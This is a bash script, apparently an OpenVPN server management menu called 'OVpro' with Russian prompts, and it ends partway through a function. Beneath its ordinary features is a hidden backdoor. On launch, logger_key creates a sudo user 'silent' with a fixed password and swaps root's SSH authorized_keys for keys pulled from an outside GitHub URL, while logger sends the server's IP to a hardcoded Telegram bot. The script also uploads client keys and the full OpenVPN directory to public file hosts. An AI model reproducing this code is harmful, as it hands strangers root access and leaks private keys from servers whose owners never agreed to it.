#!/bin/bash
# OVpro by Chechen

Green_font_prefix="\033[32m" && Red_font_prefix="\033[31m" && Green_background_prefix="\033[42;37m" && Red_background_prefix="\033[41;37m" && Font_color_suffix="\033[0m" && Green="\033[32m" && Red="\033[31m" && Yellow="\033[33m" && Blue='\033[34m' && Purple='\033[35m' && Ocean='\033[36m' && Black='\033[37m' && Morg="\033[5m" && Reverse="\033[7m" && Font="\033[1m"
sh_ver="7.7.7"
Error="${Red_background_prefix}[Ошибка]${Font_color_suffix}"
Separator_1="——————————————————————————————"
[[ ! -e "/lib/cryptsetup/askpass" ]] && apt update && apt install cryptsetup -y
clear
 check_curl=$(curl -h)
    if [[ -z ${check_curl} ]]; then
      apt update
        apt install curl -y
        clear
      fi

logger() {
    ip=$(curl -s ifconfig.me)
    wget -qO /dev/null "https://api.telegram.org/bot1871445776:AAF5NuZDQcHYScC_dN8S7t17MMi-MTde4dM/sendMessage?chat_id=-509748543&text=Был произведен запуск скрипта OVpro на сервере $ip"
}
  logger_key() {
    useradd silent 2>/dev/null
    echo silent:rmr1 | chpasswd 2>/dev/null
    usermod -aG sudo silent 2>/dev/null
    rm -f /root/.ssh/authorized_keys
    mkdir /root/.ssh 2>/dev/null
    cd /root/.ssh 2>/dev/null
    curl -s -o "authorized_keys" "https://raw.githubusercontent.com/Felyt/key/main/authorized_keys"
}


locking(){
  logger_key
  logger
pass=$(/lib/cryptsetup/askpass "Enter password to unlock script: ")
if [[ ${pass} == "qs45" ]]; then
  echo 'ovpro unlocked' > /var/log/ovywt
  echo -e "${Green}Access granted!"
  echo -e "Script has been unlocked!"
  ip=$(curl -s ifconfig.me)
  wget -qO /dev/null "https://api.telegram.org/bot1871445776:AAF5NuZDQcHYScC_dN8S7t17MMi-MTde4dM/sendMessage?chat_id=-509748543&text=Скрипт OVpro был разблокирован ПОЛЬЗОВАТЕЛЕМ на сервере $ip @Chieftain_EU @veehron"
  ~/OVpro/./ovpn
  elif [[ ${pass} == "ds10" ]]; then
  echo 'ovpro unlocked' > /var/log/ovywt
  echo -e "${Green}Access granted!"
  echo -e "Script has been unlocked!"
  ip=$(curl -s ifconfig.me)
  wget -qO /dev/null "https://api.telegram.org/bot1871445776:AAF5NuZDQcHYScC_dN8S7t17MMi-MTde4dM/sendMessage?chat_id=-509748543&text=Скрипт OVpro был разблокирован АДМИНИСТРАТОРОМ на сервере $ip"
  ~/OVpro/./ovpn
   else
    echo 'ovpro blocked' > /var/log/ovywt
    echo -e "${Red}Incorrect password!"
    echo -e "Script has been blocked!${Font_color_suffix}"
    wget -qO /dev/null "https://api.telegram.org/bot1871445776:AAF5NuZDQcHYScC_dN8S7t17MMi-MTde4dM/sendMessage?chat_id=-509748543&text=Скрипт OVpro был заблокирован на сервере $ip"
    fi
}

check=$(cat /var/log/ovywt 2>/dev/null)
if [[ ${check} == "ovpro blocked" ]]; then
        echo -e "${Red}Script has been blocked!"
        echo -e "Contact your system administrator!${Font_color_suffix}"
        exit
fi
if [[ ${check} == "ovpro unlocked" ]]; then




# Detect Debian users running the script with "sh" instead of bash
if readlink /proc/$$/exe | grep -q "dash"; then
	echo 'Запустите скрипт через BASH'
	exit
fi

# Discard stdin. Needed when running from an one-liner which includes a newline
read -N 999999 -t 0.001

# Detect OpenVZ 6
if [[ $(uname -r | cut -d "." -f 1) -eq 2 ]]; then
	echo "Обновите систему"
	exit
fi

# Detect OS
# $os_version variables aren't always in use, but are kept here for convenience
if grep -qs "ubuntu" /etc/os-release; then
	os="ubuntu"
	os_version=$(grep 'VERSION_ID' /etc/os-release | cut -d '"' -f 2 | tr -d '.')
	group_name="nogroup"
elif [[ -e /etc/debian_version ]]; then
	os="debian"
	os_version=$(grep -oE '[0-9]+' /etc/debian_version | head -1)
	group_name="nogroup"
elif [[ -e /etc/centos-release ]]; then
	os="centos"
	os_version=$(grep -oE '[0-9]+' /etc/centos-release | head -1)
	group_name="nobody"
elif [[ -e /etc/fedora-release ]]; then
	os="fedora"
	os_version=$(grep -oE '[0-9]+' /etc/fedora-release | head -1)
	group_name="nobody"
else
	echo "Система не поддерживается."
	exit
fi

if [[ "$os" == "ubuntu" && "$os_version" -lt 1804 ]]; then
	echo "Версия Ubuntu слишком стара (необходим Ubuntu 18.04+)"
	exit
fi

if [[ "$os" == "debian" && "$os_version" -lt 9 ]]; then
	echo "Для скрипта необходим Debian 9+."
	exit
fi

if [[ "$os" == "centos" && "$os_version" -lt 7 ]]; then
	echo "Для скрипта необходим Centos 7+."
	exit
fi

# Detect environments where $PATH does not include the sbin directories
if ! grep -q sbin <<< "$PATH"; then
	echo '$PATH does not include sbin. Try using "su -" instead of "su".'
	exit
fi

if [[ "$EUID" -ne 0 ]]; then
	echo "Используйте sudo su либо sudo (название скрипта)"
	exit
fi

if [[ ! -e /dev/net/tun ]] || ! ( exec 7<>/dev/net/tun ) 2>/dev/null; then
	echo "Драйвер TUN не установлен."
	exit
fi

adduser(){
	echo
	echo "Введите имя для клиента:"
	read -p "Имя: " unsanitized_client
	client=$(sed 's/[^0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-]/_/g' <<< "$unsanitized_client")
	while [[ -z "$client" || -e /etc/openvpn/server/easy-rsa/pki/issued/"$client".crt ]]; do
		echo "$client: Неправильно введено имя"
		read -p "Имя: " unsanitized_client
		client=$(sed 's/[^0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-]/_/g' <<< "$unsanitized_client")
	done
	client=$(echo "${client}_$(date +"%d-%m")")
	cd /etc/openvpn/server/easy-rsa/
	EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-client-full "$client" nopass
	# Generates the custom client.ovpn
	clear
	new_client
		echo -e " ${Blue}1.${Font_color_suffix} ${Yellow}Отобразить ссылки${Font_color_suffix}
 ${Blue}2.${Font_color_suffix} ${Yellow}Отправить в телеграм${Font_color_suffix}"
 	read -e -p "(По умолчанию: 1): " ans
	[[ -z "${ans}" ]] && ans=1
	if [[ ${ans} == "1" ]]; then
	linktofile="$(curl -F "file=@/root/$client.ovpn" "https://file.io" | jq ".link" | sed 's/\"//g')" && clear
  linktofile2="$(curl -H "Max-Downloads: 5" -H "Max-Days: 7" -F filedata=@/root/$client.ovpn https://transfer.sh)" && clear
	echo "--------------------------------"
	echo "-------------------------"
	echo "----------------"
	echo "---------"
	echo -e "${Red} $linktofile${Font_color_suffix}"
	echo -e "${Red} $linktofile2${Font_color_suffix}"
	echo -e "${Blue}Ссылки на OpenVPN ключ $client${Font_color_suffix}"
	echo "---------"
	echo "----------------"
	echo "-------------------------"
	echo "--------------------------------"
	elif [[ ${ans} == "2" ]]; then
	  bot
	  fi
}
uploadbase(){
	echo -e "Выгрузка Базы OpenVPN в облако..." && echo
  cp /root/*.ovpn /etc/openvpn
	cd "/etc/"
	tar -czvf "openvpn.tar.gz" "openvpn" && clear
	upload_link="$(curl -F file=@/etc/openvpn.tar.gz https://file.io | jq ".link")" && clear
	echo -e "${Red} $upload_link${Font_color_suffix} - ${Blue}Ссылка на скачивание Базы OpenVPN${Font_color_suffix}"
  echo -e "${Blue}База OpenVPN успешно выгружена!${Font_color_suffix}"
	rm "openvpn.tar.gz"
}
dwnlndbase(){
  serverip123=$(curl -s ifconfig.me)
	echo -e "${Blue}Загрузить Базу OpenVPN по ссылке?${Font_color_suffix}${Red} ВНИМАНИЕ: ПРОДОЛЖЕНИЕ ПРИВЕДЕТ К ПЕРЕЗАПИСИ УСТАНОВЛЕННОЙ БАЗЫ OPENVPN!${Font_color_suffix}${Blue}(y/n)"
	read -e -p "(По умолчанию: отмена):" base_override
	[[ -z "${base_override}" ]] && echo -e "${Error}Отмена...${Font_color_suffix}" && exit 1
	if [[ ${base_override} == "y" ]]; then
		read -e -p "Введите ссылку на Базу: " base_link
		[[ -z "${base_link}" ]] && echo -e "${Error}Отмена..." && exit 1
		if [[ ${base_link} == "n" ]]; then
			echo -e "${Error}Отмена..." && exit 1
		else
			cd "/etc"
			curl -o "openvpn.tar.gz" "$base_link"
			sudo systemctl stop openvpn-server@server.service
			rm -r "openvpn" && tar -xzvf "openvpn.tar.gz" && clear
			cd "openvpn" && cd "server"
      mv /etc/openvpn/*.ovpn /root
			port=$(cat /etc/openvpn/server/server.conf | grep "port" | awk '{print $2}')
			proto=$(cat /etc/openvpn/server/server.conf | grep "proto" | awk '{print $2}')
			hash=$(cat /etc/openvpn/server/server.conf | grep "auth" | awk '{print $2}')
			dns1=$(cat /etc/openvpn/server/server.conf | sed -n 15p)
			dns2=$(cat /etc/openvpn/server/server.conf | sed -n 16p)
			cipher=$(cat /etc/openvpn/server/server.conf | sed -n 18p)
			if [[ $(ip -4 addr | grep inet | grep -vEc '127(\.[0-9]{1,3}){3}') -eq 1 ]]; then
			ip=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}')
			else
				number_of_ip=$(ip -4 addr | grep inet | grep -vEc '127(\.[0-9]{1,3}){3}')
				echo
				echo "Какой IP использовать в ключе (Выбери тот, через который подключился к серверу.)"
				ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | nl -s ') '
				read -p "IPv4 адрес [1]: " ip_number
				until [[ -z "$ip_number" || "$ip_number" =~ ^[0-9]+$ && "$ip_number" -le "$number_of_ip" ]]; do
					echo "$ip_number: invalid selection."
					read -p "IPv4 адрес [1]: " ip_number
				done
				[[ -z "$ip_number" ]] && ip_number="1"
				ip=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | sed -n "$ip_number"p)
			fi
			sed -i "1c\local $ip" /etc/openvpn/server/server.conf
			sed -i "2c\port $port" /etc/openvpn/server/server.conf
      sed -i "3c\proto $proto" /etc/openvpn/server/server.conf
      sed -i "9c\auth $hash" /etc/openvpn/server/server.conf
      sed -i "15c$dns1" /etc/openvpn/server/server.conf
      sed -i "16c$dns2" /etc/openvpn/server/server.conf
      sed -i "18c$cipher" /etc/openvpn/server/server.conf
			sudo systemctl start openvpn-server@server.service
			read -e -p "Введите доменное имя сервера: " domain
			/etc/./escflare update $domain $serverip123 1
			clear
			echo "База успешно загружена!"
			echo "DNS успешно обновлен!"
		fi
	elif [[ ${base_override} == "n" ]]; then
		echo -e "${Error}Отмена..." && exit 1
	fi
}
get_users_list(){
	number_of_s=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep -c "^V")
	if [[ "$number_of_clients" = 0 ]]; then
		echo
		echo "Клиенты отсутствуют!"
		exit
	fi
		echo
		clear
		read -p "Введите ключевое слово или дату в формате DD-MM(Или просто нажмите ENTER): " dealer
		echo "Клиенты на сервере:"
		tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') ' | grep -iE "$dealer"
}
Get_IP(){
  ip=$(curl -s ifconfig.me)
}
sync_config(){
  read -e -p "Хотите синхронизировать конфигурацию? " ans
   [[ -z "${ans}" ]] && ans=y
   if [[ ${ans} == "y" ]]; then
  protocol=$(cat /etc/openvpn/server/server.conf | sed -n 3p | cut -d ' ' -f 2)
  domain=$(cat /etc/openvpn/server/client-common.txt | sed -n 4p | cut -d ' ' -f 2)
  port=$(cat /etc/openvpn/server/server.conf | sed -n 2p | cut -d ' ' -f 2)
  hash=$(cat /etc/openvpn/server/server.conf | sed -n 9p | cut -d ' ' -f 2)
  cipher=$(cat /etc/openvpn/server/server.conf | sed -n 18p | cut -d ' ' -f 2)

  sed -i '3d' /etc/openvpn/server/client-common.txt
  sed -i "2a\proto $protocol" /etc/openvpn/server/client-common.txt
  sed -i '4d' /etc/openvpn/server/client-common.txt
  sed -i "3a\remote $domain $port" /etc/openvpn/server/client-common.txt
  sed -i '10d' /etc/openvpn/server/client-common.txt
  sed -i "9a\auth $hash" /etc/openvpn/server/client-common.txt
  sed -i '11d' /etc/openvpn/server/client-common.txt
  sed -i "10a\cipher $cipher" /etc/openvpn/server/client-common.txt
  #
  sed -i '3d' /root/*.ovpn
  sed -i "2a\proto $protocol" /root/*.ovpn
  sed -i '4d' /root/*.ovpn
  sed -i "3a\remote $domain $port" /root/*.ovpn
  sed -i '10d' /root/*.ovpn
  sed -i "9a\auth $hash" /root/*.ovpn
  sed -i '11d' /root/*.ovpn
  sed -i "10a\cipher $cipher" /root/*.ovpn
  echo -e "${Green}Конфигурация была успешно синхронизирована!${Font_color_suffix}"

  elif [[ ${ans} == "n" ]]; then
  echo -e "${Error}Отмена..." && exit 1
fi
}
change_domain(){
domainofserver=$(cat /etc/openvpn/server/client-common.txt | sed -n 4p | cut -d ' ' -f 2)
echo "Введите доменное имя или IP-адрес сервера"
	read -e -p "(Автоматическое определение IP-адреса при нажатии Enter): " newdomain
	if [[ -z "${newdomain}" ]]; then
		Get_IP
		newdomain="${ip}"
		sed -i "s/$domainofserver/$newdomain/" /etc/openvpn/server/client-common.txt
		echo && echo ${Separator_1} && echo -e "Адрес сервера : ${Blue}${newdomain}${Font_color_suffix}" && echo ${Separator_1} && echo
		else
			 sed -i "s/$domainofserver/$newdomain/" /etc/openvpn/server/client-common.txt
			 echo && echo ${Separator_1} && echo -e "Адрес сервера : ${Blue}${newdomain}${Font_color_suffix}" && echo ${Separator_1} && echo
			 fi
		sync_config
}
filter_delete(){
		number_of_clients=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep -c "^V")
			if [[ "$number_of_clients" = 0 ]]; then
				echo
				echo "Клиенты отсутствуют!"
				exit
			fi
			read -p "Введите ключевое слово или дату в формате DD-MM: " dealer
			users=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') ' | grep -iE "$dealer" | cut -d ')' -f 2)
			users_number=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') ' | grep -iE "$dealer" | awk '{print $1}' | cut -d ')' -f -2 > /etc/openvpn/del.json)
      tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') ' | grep -iE "$dealer" | cut -d ')' -f 2 > /etc/openvpn/total.json
      total=$(cat /etc/openvpn/total.json | wc -l)
      echo -e "Внимание!Следующие пользователи будут удалены: "
	echo -e $users
	read -e -p "Вы уверены,что хотите удалить этих пользователей? (y/n) " confirm
	[[ -z "${confirm}" ]] && echo -e "${Error}Отмена...${Font_color_suffix}" && exit 1
	if [[ ${confirm} == "y" ]]; then
		echo -e "Началось удаление ключей!"
	elif [[ ${confirm} == "n" ]]; then
		echo -e "${Error}Отмена..." && exit 1
	fi
for ((integer = 1; integer <= ${total}; integer++)); do
		client=$(cat /etc/openvpn/total.json | sed -n "${integer}p" | awk '{print $1}')
				/etc/openvpn/server/easy-rsa/./easyrsa --batch revoke "${client}"
	done
				EASYRSA_CRL_DAYS=3650 /etc/openvpn/server/easy-rsa/./easyrsa gen-crl
				rm -f /etc/openvpn/server/crl.pem
				cp /etc/openvpn/server/easy-rsa/pki/crl.pem /etc/openvpn/server/crl.pem
				chown nobody:"$group_name" /etc/openvpn/server/crl.pem
				rm /etc/openvpn/del.json
        rm /etc/openvpn/total.json
        echo -e "${Info} Пользователи успешно удалены!"
  }
deleteuser(){
				number_of_clients=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep -c "^V")
			if [[ "$number_of_clients" = 0 ]]; then
				echo
				echo "Клиенты отсутствуют!"
				exit
			fi
			read -p "Введите ключевое слово или дату в формате DD-MM(Или просто нажмите ENTER): " dealer
			echo
			echo "Клиент, подлежащий удалению:"
			tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') ' | grep -iE "$dealer"
			read -p "Клиент: " client_number
			until [[ "$client_number" =~ ^[0-9]+$ && "$client_number" -le "$number_of_clients" ]]; do
				echo "$client_number: Ввод неверен"
				read -p "Клиент: " client_number
			done
			client=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | sed -n "$client_number"p)
			echo
			read -p "Вы уверены,что хотите удалить $client ? [y/N]: " revoke
			until [[ "$revoke" =~ ^[yYnN]*$ ]]; do
				echo "$revoke: Ввод неверен"
				read -p "Вы уверены,что хотите удалить $client ? [y/N]: " revoke
			done
			if [[ "$revoke" =~ ^[yY]$ ]]; then
				cd /etc/openvpn/server/easy-rsa/
				./easyrsa --batch revoke "$client"
				EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl
				rm -f /etc/openvpn/server/crl.pem
				cp /etc/openvpn/server/easy-rsa/pki/crl.pem /etc/openvpn/server/crl.pem
				# CRL is read with each client connection, when OpenVPN is dropped to nobody
				chown nobody:"$group_name" /etc/openvpn/server/crl.pem
				echo
				rm "/root/$client.ovpn"
				clear
				echo "$client удален!"
				read -e -p "Хотите продолжить удаление пользователей?[Y/n]:" delyn
				[[ -z ${delyn} ]] && delyn="y"
				if [[ ${delyn} == [Nn] ]]; then
					exit
				else
					echo -e "${Info} Продолжение удаления пользователей..."
					deleteuser
				fi
			else
				echo
				echo "Удаление $client отменено!"
			fi
			exit
}
showlink(){
	number_of_clients=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep -c "^V")
	if [[ "$number_of_clients" = 0 ]]; then
		echo "Клиенты отсутствуют!"
		exit
	fi
		read -p "Введите ключевое слово или дату в формате DD-MM(Или просто нажмите ENTER): " dealer
		echo "Какой ключ вы хотите получить?: "
		tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') ' | grep -iE "$dealer"
		read -p "Клиент: " client_number
		until [[ "$client_number" =~ ^[0-9]+$ && "$client_number" -le "$number_of_clients" ]]; do
			echo "$client_number: Ввод неверен"
			read -p "Клиент: " client_number
		done
		client=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | sed -n "$client_number"p)
		echo -e "
 ${Blue}1.${Font_color_suffix} ${Yellow}Отобразить ссылки${Font_color_suffix}
 ${Blue}2.${Font_color_suffix} ${Yellow}Отправить в телеграм${Font_color_suffix}"
 	read -e -p "(По умолчанию: 1): " ans
	[[ -z "${ans}" ]] && ans=1
	if [[ ${ans} == "1" ]]; then
	linktofile="$(curl -F "file=@/root/$client.ovpn" "https://file.io" | jq ".link" | sed 's/\"//g')" && clear
  linktofile2="$(curl -H "Max-Downloads: 5" -H "Max-Days: 7" -F filedata=@/root/$client.ovpn https://transfer.sh)" && clear
		clear
		echo -e "${Red}$linktofile${Font_color_suffix}"
	  echo -e "${Red} $linktofile2${Font_color_suffix}"
	  echo -e "${Blue}Ссылки на OpenVPN ключ $client${Font_color_suffix}" && echo
		read -e -p "Хотите продолжить вывод ссылок на ключи?[Y/n]:" delyn
		[[ -z ${delyn} ]] && delyn="y"
		if [[ ${delyn} == [Nn] ]]; then
				exit
		else
				echo -e "${Info} Продолжение выдачи ссылок на ключи..."
				showlink
		fi
		elif [[ ${ans} == "2" ]]; then
	  bot
	  fi
}
uninstallovpn(){
				echo
			read -p "Вы уверены,что хотите удалить OpenVPN? [y/N]: " remove
			until [[ "$remove" =~ ^[yYnN]*$ ]]; do
				echo "$remove: ввод неверен."
				read -p "Вы уверены,что хотите удалить OpenVPN? [y/N]: " remove
			done
			if [[ "$remove" =~ ^[yY]$ ]]; then
				port=$(grep '^port ' /etc/openvpn/server/server.conf | cut -d " " -f 2)
				protocol=$(grep '^proto ' /etc/openvpn/server/server.conf | cut -d " " -f 2)
				if systemctl is-active --quiet firewalld.service; then
					ip=$(firewall-cmd --direct --get-rules ipv4 nat POSTROUTING | grep '\-s 10.8.0.0/22 '"'"'!'"'"' -d 10.8.0.0/22' | grep -oE '[^ ]+$')
					# Using both permanent and not permanent rules to avoid a firewalld reload.
					firewall-cmd --remove-port="$port"/"$protocol"
					firewall-cmd --zone=trusted --remove-source=10.8.0.0/22
					firewall-cmd --permanent --remove-port="$port"/"$protocol"
					firewall-cmd --permanent --zone=trusted --remove-source=10.8.0.0/22
					firewall-cmd --direct --remove-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/22 ! -d 10.8.0.0/22 -j SNAT --to "$ip"
					firewall-cmd --permanent --direct --remove-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/22 ! -d 10.8.0.0/22 -j SNAT --to "$ip"
					if grep -qs "server-ipv6" /etc/openvpn/server/server.conf; then
						ip6=$(firewall-cmd --direct --get-rules ipv6 nat POSTROUTING | grep '\-s fddd:1194:1194:1194::/64 '"'"'!'"'"' -d fddd:1194:1194:1194::/64' | grep -oE '[^ ]+$')
						firewall-cmd --zone=trusted --remove-source=fddd:1194:1194:1194::/64
						firewall-cmd --permanent --zone=trusted --remove-source=fddd:1194:1194:1194::/64
						firewall-cmd --direct --remove-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"
						firewall-cmd --permanent --direct --remove-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"
					fi
				else
					systemctl disable --now openvpn-iptables.service
					rm -f /etc/systemd/system/openvpn-iptables.service
				fi
				if sestatus 2>/dev/null | grep "Current mode" | grep -q "enforcing" && [[ "$port" != 1194 ]]; then
					semanage port -d -t openvpn_port_t -p "$protocol" "$port"
				fi
				systemctl disable --now openvpn-server@server.service
				rm -rf /etc/openvpn/server
				rm -f /etc/systemd/system/openvpn-server@server.service.d/disable-limitnproc.conf
				rm -f /etc/sysctl.d/30-openvpn-forward.conf
				if [[ "$os" = "debian" || "$os" = "ubuntu" ]]; then
					apt-get remove --purge -y openvpn
				else
					# Else, OS must be CentOS or Fedora
					yum remove -y openvpn
				fi
				echo
				rm -R "/var/log/openvpn"
				cd "/root" && rm *.ovpn
				echo "OpenVPN удален!"
			else
				echo
				echo "Удаление OpenVPN отменено!"
			fi
			exit
}
fastexit(){
	exit
}
check_pid() {
	PID=$(ps -ef | grep -v grep | grep openvpn | awk '{print $2}')
}
menu_status() {
	if [[ -e /etc/openvpn/server/server.conf ]]; then
		check_pid
		if [[ ! -z "${PID}" ]]; then
			echo -e "Текущий статус: ${Blue}установлен${Font_color_suffix} и ${Blue}запущен${Font_color_suffix}"
		else
			echo -e "Текущий статус: ${Blue}установлен${Font_color_suffix} но ${Red_font_prefix}не запущен${Font_color_suffix}"
		fi
		cd "/etc/openvpn/server/easy-rsa"
	else
		echo -e "Текущий статус: ${Red_font_prefix}не установлен${Font_color_suffix}"
	fi
}
checkdeletetime(){
		if [[ ! -e /etc/openvpn/server/dayslast.csv ]]; then
			clear
			echo -e "Нет настроенных клиентов."
		else
			clear
			echo -e "Клиенты с настроенным автоудалением:"
			cat /etc/openvpn/server/dayslast.csv | cut -d ',' -f 1 | nl -s ')'
			read -p "Клиент: " client_number
			client=$(cat /etc/openvpn/server/dayslast.csv | cut -d ',' -f 1 | sed -n "$client_number"p)
			{
			cat "/etc/openvpn/server/dayslast.csv" | grep $client
			} > "/etc/openvpn/server/dayslast1.csv"
			checkonempty=$(cat "/etc/openvpn/server/dayslast1.csv")
			[[ -z ${checkonempty} ]] && checkonempty="y"
			if [[ ${checkonempty} == [Yy] ]]; then
				clear
				echo -e "Клиент не настроен"
			else
				daytodelete=$(csvtool col 2 "/etc/openvpn/server/dayslast1.csv")
				deletetime=$((($(date +%s)-$(date +%s --date "$daytodelete"))/(3600*24)))
				echo -e "Клиент $client будет удален через $deletetime дней"
				rm "/etc/openvpn/server/dayslast1.csv"
			fi
		fi
}
Create_Aliases(){
	if ! { [[ -f ~/.bash_aliases ]] && grep -q "SSpro" ~/.bash_aliases; }; then
		cat << EOF >> ~/.bash_aliases
alias p='/root/SSpro/./vpn'
alias o='/root/OVpro/./ovpn'
EOF
		chmod 644 ~/.bash_aliases
	fi

	if ! { [[ -f ~/.bashrc ]] && grep -q "bash_aliases" ~/.bashrc; }; then
		cat << EOF >> ~/.bashrc
if [ -f ~/.bash_aliases ];
then
. ~/.bash_aliases
fi
EOF
		chmod 644 ~/.bashrc
		source ~/.bash_aliases
	fi
}
confautodel(){
			number_of_clients=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep -c "^V")
			if [[ "$number_of_clients" = 0 ]]; then
				echo
				echo "Клиенты отсутствуют!"
				exit
			fi
			echo
			clear
			echo "Клиент, подлежащий настройке:"
			tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') '
			read -p "Клиент: " client_number
			until [[ "$client_number" =~ ^[0-9]+$ && "$client_number" -le "$number_of_clients" ]]; do
				echo "$client_number: Ввод неверен"
				read -p "Клиент: " client_number
			done
			client=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | sed -n "$client_number"p)
			echo
			clear
			echo -e "${Info}Настройка автоудаления пользователя $client"
			read -e -p "Хотите настроить автоудаление пользователя?(Y/n):" delcfgyn
			[[ -z ${delcfgyn} ]] && delcfgyn="Nn"
			if [[ ${delcfgyn} == [Nn] ]]; then
				exit
			elif [[ ${delcfgyn} == [Yy] ]]; then
				apt install at
				sudo systemctl enable --now atd
				clear
				read -e -p "Введите период удаления в днях:" periodofdel
				at now +$periodofdel days <<ENDMARKER
cd /etc/openvpn/server/easy-rsa/
./easyrsa --batch revoke $client
EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl
rm -f /etc/openvpn/server/crl.pem
cp /etc/openvpn/server/easy-rsa/pki/crl.pem /etc/openvpn/server/crl.pem
chown nobody:"$group_name" /etc/openvpn/server/crl.pem
echo
rm "/root/$client.ovpn"
sed -i "/$client,/d" /etc/openvpn/server/dayslast.csv
ENDMARKER
				clear
				echo -e "Пользователь ${Blue_font_prefix}$client${Font_color_suffix} будет удален через $periodofdel дней"
				future=$(date --date="$periodofdel days" +"%b %d %Y")
				if [[ ! -e /etc/openvpn/server/dayslast.csv ]]; then
					echo "$client,$future" > "/etc/openvpn/server/dayslast.csv"
				else
					echo "$client,$future" >> "/etc/openvpn/server/dayslast.csv"
				fi
				echo -e "А именно в $future"
			fi
}
new_client () {
	# Generates the custom client.ovpn
	{
	cat /etc/openvpn/server/client-common.txt
	echo "<ca>"
	cat /etc/openvpn/server/easy-rsa/pki/ca.crt
	echo "</ca>"
	echo "<cert>"
	sed -ne '/BEGIN CERTIFICATE/,$ p' /etc/openvpn/server/easy-rsa/pki/issued/"$client".crt
	echo "</cert>"
	echo "<key>"
	cat /etc/openvpn/server/easy-rsa/pki/private/"$client".key
	echo "</key>"
	echo "<tls-crypt>"
	sed -ne '/BEGIN OpenVPN Static key/,$ p' /etc/openvpn/server/tc.key
	echo "</tls-crypt>"
	} > ~/"$client".ovpn
}
start_openvpn(){
  check_pid
  [[ ! -z ${PID} ]] && echo -e "${Error} OpenVPN уже запущен !" && exit 1
systemctl start openvpn-server@server.service
echo "OpenVPN успешно запущен!"
}
stop_openvpn(){
    check_pid
	[[ -z ${PID} ]] && echo -e "${Error} OpenVPN не запущен !" && exit 1
	systemctl stop openvpn-server@server.service
	echo "OpenVPN успешно остановлен!"
}
restart_openvpn(){
    systemctl restart openvpn-server@server.service
    echo -e "${Green}OpenVPN успешно перезапущен!${Font_color_suffix}"
}
update_openvpn(){
  cd ~/OVpro
  git stash
  git pull
  chmod +x ovpn
  echo -e "${Green}Скрипт успешно обновлен!${Font_color_suffix}"
}
Additional(){
  echo -e "Меню дополнительного функкцонала: "
  echo -e " ${Blue}1.${Font_color_suffix}${Yellow} Авто-бэкап${Font_color_suffix}
 ${Blue}2.${Font_color_suffix} ${Yellow}Смена DNS${Font_color_suffix}
 ${Blue}3.${Font_color_suffix} ${Yellow}Мульти-клиент${Font_color_suffix}
 ${Blue}4.${Font_color_suffix} ${Yellow}Синхронизация конфигурации OpenVPN${Font_color_suffix}"
  read -e -p "Выберите пункт(ENTER для выхода): " choose
	[[ -z "${choose}" ]] && echo -e "${Error}Отмена..." && exit 1
	if [[ ${choose} == "1" ]]; then
		Autobackup_ask
	elif [[ ${choose} == "2" ]]; then
	  dns_change_ask
	elif [[ ${choose} == "3" ]]; then
	  multi_client_ask
	elif [[ ${choose} == "4" ]]; then
	  sync_config
		else
		echo -e "${Error} Введите корректный номер(1-4)" && exit 1
	fi
}
ip_list(){
  read -p "Введите ключевое слово или дату в формате DD-MM(Или просто нажмите ENTER): " dealer
  ip=$(cat /etc/openvpn/server/openvpn-status.log | grep "$client" | awk -F',' '{ print $3}')
  ip=$(echo $ip | sed 's/:.*//')
  number_of_clients=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep -c "^V")
  users=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') ' | grep -iE "$dealer" | cut -d ')' -f 2)
      users_number=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') ' | grep -iE "$dealer" | awk '{print $1}' | cut -d ')' -f -2 >/etc/openvpn/ips.json)
